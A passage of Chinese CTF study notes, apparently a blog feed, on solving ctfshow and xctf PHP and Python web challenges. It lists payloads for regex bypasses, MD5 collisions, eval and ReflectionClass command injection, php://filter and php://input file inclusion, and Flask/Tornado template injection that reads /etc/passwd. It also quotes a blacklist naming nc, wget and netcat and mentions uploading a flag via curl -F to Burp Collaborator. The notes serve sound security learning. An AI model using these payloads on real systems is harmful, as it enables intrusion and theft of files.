能处理的长度有限，超过一点长度就不认为是文件</p><p><font>/proc/self/root/</font>  代表根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><ul><li><mark>readfile()</mark></li></ul><ol><li>使用 php://filter   <em>中间的过滤器错误只会 warning，不影响</em></li></ol><p>f=php://filter/ctfshow/resource=flag.php</p><ol start="2"><li>目录穿越</li></ol><p>…/…/…/var/www/html/flag.php</p><h2 id="正则匹配绕过"><a class="markdownIt-Anchor" href="#正则匹配绕过">#</a> 正则匹配绕过</h2><h3 id="preg_match"><a class="markdownIt-Anchor" href="#preg_match">#</a> preg_match</h3><ul><li><mark>m 多行模式</mark></li></ul><p>参数为数组时会报错返回 0<br><mark>$</mark> 匹配结尾位置 <!--如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’--></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>)) <span class="comment">//m多行模式，某一行匹配到就通过</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))  <span class="comment">//单行模式，因为有个%0a换行符，则只在第一行匹配</span></span><br></pre></td></tr></table></figure><p>绕过：aaa%0Aphp</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a>  Apache HTTPD 换行解析漏洞 (CVE-2017-15715) 与拓展</p><ul><li><mark>传址</mark></li></ul><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312155207.png" alt=""></p><p>最后一行为三元运算符，需要 $_GET [‘HTTP_FLAG’]==‘flag’</p><p><code>$_GET?$_GET=&amp;$_POST:'flag'; </code> <br>使用 ==&amp;== 改变了 get 方法的地址，将 get 变成了 post<br>payload:url 随便传值，post:HTTP_FLAG=flag</p><p>解法 2：post:flag=flag   cookie:HTTP_FLAG=flag</p><h3 id="ereg"><a class="markdownIt-Anchor" href="#ereg">#</a> <mark>ereg()</mark></h3><ol><li>只能处理字符串，遇见数组返回 null</li><li>00 截断    <code>a%00123</code></li></ol><h3 id="溢出"><a class="markdownIt-Anchor" href="#溢出">#</a> 溢出</h3><p>当要匹配的字符串过长，正则表达式就会失效。默认最大长度是 10 万</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://10f96bfc-6286-486a-9dd8-aff309362a7b.challenge.ctf.show&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line">data = <span class="built_in">dict</span>(f=<span class="built_in">str</span>)</span><br><span class="line">ret = requests.post(url, data=data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><details>    <summary>遇到的坑</summary>    <p>要将http改为https</p></details><h2 id=""><a class="markdownIt-Anchor" href="#">#</a> ==</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>用 <code>4476e123</code>  可绕过。这里 <code>e123</code>  被当做科学计数法</p><p>如果限制了字母：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>可以用小数绕过： <code>4476.1</code>   <code>+4476.1</code>  八进制： <code>010574 </code>   <code>%20010574</code></p><ul><li><p><mark>highlight_file($_GET[‘u’])</mark></p><p>参数 u 限制了不能等于 flag.php, 可用./flag.php</p></li></ul><h2 id="md5碰撞"><a class="markdownIt-Anchor" href="#md5碰撞">#</a> md5 碰撞</h2><ul><li><mark>强比较</mark></li></ul><ol><li>数组绕过： <code>a[]=1&amp;b[]=2</code></li><li>不同明文相同 MD5 值<br> a=%4d% c9%68% ff%0e% e3%5c%20%95%72% d4%77%7b%72%15%87% d3%6f% a7% b2%1b% dc%56% b7%4a%3d% c0%78%3e%7b%95%18% af% bf% a2%00% a8%28%4b% f3%6e%8e%4b%55% b3%5f%42%75%93% d8%49%67%6d% a0% d1%55%5d%83%60% fb%5f%07% fe% a2&amp;b=%4d% c9%68% ff%0e% e3%5c%20%95%72% d4%77%7b%72%15%87% d3%6f% a7% b2%1b% dc%56% b7%4a%3d% c0%78%3e%7b%95%18% af% bf% a2%02% a8%28%4b% f3%6e%8e%4b%55% b3%5f%42%75%93% d8%49%67%6d% a0% d1% d5%5d%83%60% fb%5f%07% fe% a2</li></ol><h2 id="获得类的信息"><a class="markdownIt-Anchor" href="#获得类的信息">#</a> 获得类的信息</h2><ul><li><mark>var_dump</mark></li></ul><p>var_dump 能输出变量的信息，也可以输出类的信息</p><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011341443.png" alt="image-20241101134132415"></p><p><span alt="dotted">“=” 赋值的优先级高于 and</span></p><p>eval 执行 php 代码，payload: <code>?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code></p><p>中间无效的字符串通过构造注释符号注释掉</p><h3 id="php内置类"><a class="markdownIt-Anchor" href="#php内置类">#</a> php 内置类</h3><ul><li><mark>ReflectionClass</mark> 建立反射类</li></ul><p>反射类即类的映射</p><p>$class = new ReflectionClass (‘ctfshow’);   建立 ctfshow 这个类的反射类</p><p><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><p>不仅可以<strong>映射类</strong>，也可以<strong>映射方法</strong>。</p><p>注意：<span alt="wavy">中间的方法不需要加分号</span></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>?v1=ReflectionClass&amp;v2=system('cat *')</code></p><blockquote><p>类似还可以用:</p><p>?v1= CachingIterator&amp;v2=system(ls)<br>?v1= DirectoryIterator&amp;v2=system(ls)<br>?v1= Error&amp;v2=system(ls)<br>?v1= Exception&amp;v2=system(ls)</p></blockquote><ul><li>如果过滤了特殊符号</li></ul><p><mark>FilesystemIterator()</mark>: 获取指定目录下的所有文件</p><p><mark>getcwd()</mark>: 获取当前路径</p><p><code> ?v1=FilesystemIterator&amp;v2=getcwd</code></p><h2 id="变量覆盖"><a class="markdownIt-Anchor" href="#变量覆盖">#</a> 变量覆盖</h2><ul><li><mark>parse_str(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mn>1</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">v1,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">1</span><span class="mpunct">,</span></span></span></span>v2)</mark></li></ul><p>查询字符串解析到变量中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v1</span>=<span class="string">&quot;flag=111&quot;</span>;</span><br><span class="line"> <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span>         <span class="comment">//输出111</span></span><br></pre></td></tr></table></figure><ul><li><mark>$_SERVER[‘argv’]</mark></li></ul><p>服务器查询字符串</p><blockquote><p>?$fl0g=flag_give_me;</p><p>fun=eval($a[0])</p></blockquote><p>相当于：eval ($fl0g=flag_give_me;);<strong> 注意里面是一个变量赋值语句，要加分号</strong></p><p>或者使用 <code>parse_str</code>  解析变量</p><blockquote><p>?a=1+fl0g=flag_give_me        post:fun=parse_str($a[1])</p></blockquote><p>使用 assert 执行字符串中的 PHP 代码，不用加分号</p><blockquote><p>?<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mn>0</mn><mi>g</mi><mo>=</mo><mi>f</mi><mi>l</mi><mi>a</mi><msub><mi>g</mi><mi>g</mi></msub><mi>i</mi><mi>v</mi><msub><mi>e</mi><mi>m</mi></msub><mi>e</mi><mi>f</mi><mi>u</mi><mi>n</mi><mo>=</mo><mi>a</mi><mi>s</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">fl0g=flag_give_me           fun=assert(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">sser</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>a[0])</p></blockquote><ul><li>全局变量<br>如果有 &amp;<br> 函数内部无法调用外部的变量<br> <code>v2=GLOBALS</code></li></ul><h3 id="eval与substr"><a class="markdownIt-Anchor" href="#eval与substr">#</a> eval () 与 substr ()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>payload:?F=`$F`;+sleep(3)</p></blockquote><h3 id="curl-f"><a class="markdownIt-Anchor" href="#curl-f">#</a> curl -F</h3><blockquote><p>curl -F 将 flag 文件上传到 Burp 的 Collaborator Client</p></blockquote><h2 id="php变量过滤"><a class="markdownIt-Anchor" href="#php变量过滤">#</a> php 变量过滤</h2><ol><li>被 get 或者 post 传入的变量名，如果含有空格、+、[则会被转化为_。如果传入 [，它被转化为_之后，后面的字符就会被保留<br>绕过：变量名如果有下划线可以 <code>替换为[,%20,空格</code></li></ol><ul><li><mark>extract()</mark><br> 使用数组键名作为变量名，使用数组键值作为变量值<br> <code>extract($_POST)</code>  可以将 post 的参数转化为变量</li></ul><blockquote><p>?_POST[key1]=36d&amp;_POST[key2]=36d</p></blockquote><p>如果有 <code>@parse_str($_SERVER['QUERY_STRING']); </code> 就能转化为：<br>$_POST[key1]=36d<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">_</mi><mi>P</mi><mi>O</mi><mi>S</mi><mi>T</mi><mo stretchy="false">[</mo><mi>k</mi><mi>e</mi><mi>y</mi><mn>2</mn><mo stretchy="false">]</mo><mo>=</mo><mn>36</mn><mi>d</mi><mtext>再通过</mtext><mi>e</mi><mi>x</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">\_POST[key2]=36d  再通过extract(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.13889em;">POST</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">36</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">再通过</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>_POST) 转化为<br> $key1=36d     $key2=36d</p><ul><li><mark>绕过了很多打印符</mark></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)</span><br></pre></td></tr></table></figure><blockquote><p>GET:?1=php://filter/convert.base64-encode/resource=flag.php<br>POST:fun=include$_GET[1]</p><p>GET:?1=flag.php<br>POST:&amp;fun=highlight_file($_GET[1])</p><p>fun=var_export(get_defined_vars())</p><p>fun=highlight_file($_POST[1])&amp;1=flag.php</p></blockquote><h2 id="eval命令执行"><a class="markdownIt-Anchor" href="#eval命令执行">#</a> eval () 命令执行</h2><p><img src="https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070834300.png" alt="image-20241107083421148"></p><ul><li>分析</li></ul><p>eval 只执行前 6 个字符。传入 ==F=\`F`;+sleep 3== 就能执行整个内容</p><h3 id="解题姿势"><a class="markdownIt-Anchor" href="#解题姿势">#</a> 解题姿势</h3><ul><li><p>使用 dnslog<br>dnslog 前缀太多就不会有显示，ctfshow 上一直不成功，所以需要筛选一下</p></li><li><p>没有限制写文件</p></li></ul><blockquote><p>`F\` ;nl flag.php>1.txt\`F` ;cp flag.php&gt;1.txt 或 cp+flag.php+1.txt<br>`$F` ;mv flag.php&gt;1.txt</p></blockquote><h2 id="exec"><a class="markdownIt-Anchor" href="#exec">#</a> exec()</h2><p><strong>不会输出结果到标准输出</strong>，而是将最后一行结果作为返回值返回；</p><ul><li>将重定向到某个文件（&gt;    tee)   <code>tee命令会覆盖指定文件</code></li></ul><blockquote><p>ls / | tee 1</p><p>ls /flag | tee 2</p></blockquote><h2 id="小知识"><a class="markdownIt-Anchor" href="#小知识">#</a> 小知识</h2><ol><li>windows 系统中，url 目录有多条斜杠不影响</li><li>关注运算符<mark>优先级</mark>！（&amp;&amp; 优先级高于 ||，“=” 赋值的优先级高于 and）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xctf刷题</title>
      <link href="/2023/04/15/xctf%E5%88%B7%E9%A2%98/"/>
      <url>/2023/04/15/xctf%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="模板注入"><a class="markdownIt-Anchor" href="#模板注入">#</a> <strong>模板注入</strong></h1><h2 id="tornado-框架"><a class="markdownIt-Anchor" href="#tornado-框架">#</a> Tornado 框架</h2><h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点：</h3><ul><li>render 函数：通过传递不同的参数形成不同的改变</li><li>tornado render 模板注入漏洞：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br></pre></td></tr></table></figure><h3 id="得到cookie_secret的值"><a class="markdownIt-Anchor" href="#得到cookie_secret的值">#</a> 得到 cookie_secret 的值：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><em>handler.settings 是 tornado 框架的一个附属文件</em></p><h2 id="flassk模板注入"><a class="markdownIt-Anchor" href="#flassk模板注入">#</a> flassk 模板注入</h2><h3 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路：</h3><p>找到父类 &lt;type ‘object’&gt;–&gt; 寻找子类–&gt; 找关于命令执行或者文件操作的模块。</p><ul><li>几个魔术方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line">## &#123;&#123;&#125;&#125;:</span><br><span class="line">* 传递变量</span><br><span class="line">* 执行一些简单表达式</span><br></pre></td></tr></table></figure><hr><ul><li>：查看全局变量</li></ul><h3 id="步骤"><a class="markdownIt-Anchor" href="#步骤">#</a> 步骤：</h3><ol><li>寻找可用引用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>文件读取， <code>[40]</code>  是 tupe file 类型出现位置（从 0 开始的位置）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>命令执行 (有一个 &lt;class ‘site._Printer’&gt; 类型)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>[71]</code>  为 &lt;class ‘site._Printer’&gt; 出现位置</li></ul><h1 id="2文件include"><a class="markdownIt-Anchor" href="#2文件include">#</a> 2. 文件 include</h1><ul><li><em>5.10 更新：好久没刷题了，做个 md 复习一下</em></li></ul><h3 id="file_include过滤"><a class="markdownIt-Anchor" href="#file_include过滤">#</a> file_include (过滤)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>尝试用 php://filter:</li></ul><blockquote><p>?filename=php://filter/read=convert.base64-encode/reasource=check.php<br> 回显 &quot;do not hack!&quot;<br> 那应该是过滤</p></blockquote><ul><li>使用过滤器 convert.* (string.* 被过滤)</li><li>构造 URL：</li></ul><blockquote><p>?filename=php://filter/convert.iconv.a.b/resource=flag.php<br> <code>flag可能在flag.php</code></p></blockquote><ul><li>使用 bp 对 a,b 进行爆破 (集束炸弹)，字典如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure><h2 id="web_php_include"><a class="markdownIt-Anchor" href="#web_php_include">#</a> web_php_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);<span class="comment">//过滤了php://</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="知识点-2"><a class="markdownIt-Anchor" href="#知识点-2">#</a> 知识点</h3><ul><li>由题可知过滤了 php://, 考虑使用其它伪协议</li><li>伪协议包括：<br><strong>file 协议</strong>：<br>allow_url_fopen ：off/on<br>allow_url_include：off/on</li></ul><p>file://  <code>用于访问本地文件系统</code> ，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。</p><p><strong>php:// 协议</strong>:<br> 仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。</p><p><strong>data:// 协议</strong>：满足双 off 条件</p><ul><li><strong>strstr</strong> 函数：<br>函数用于判断字符串 str2 是否是 str1 的子串。如果是，则该函数返回 str1 字符串从 str2 第一次出现的位置开始到 str1 结尾的字符串；否则，返回 NULL。</li><li>**str_replace ()** 函数：</li></ul><blockquote><p>以其他字符替换字符串中的一些字符（区分大小写）。<br>例如：把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;world&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>,<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题意思为当传给 page 的参数有 php：// 时替换为空</p><h3 id="解题步骤"><a class="markdownIt-Anchor" href="#解题步骤">#</a> 解题步骤</h3><ol><li>使用 php：//input</li></ol><blockquote><p>构造 URL：?page=Php://input// 大写绕过<br>使用 bp 传入：<br>a=<?php system('ls');?>a</p></blockquote><ul><li>playload:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = &lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="cat"><a class="markdownIt-Anchor" href="#cat">#</a> cat</h1><ul><li>并不是命令注入</li><li>看 wp 得知</li></ul><blockquote><p>未过滤字符在 url 栏上会被进行 url 编码<br>在 url 栏测试宽字符，即 ascii 码超过 127 的 url 编码即可，也就是 %81-% ef<br> 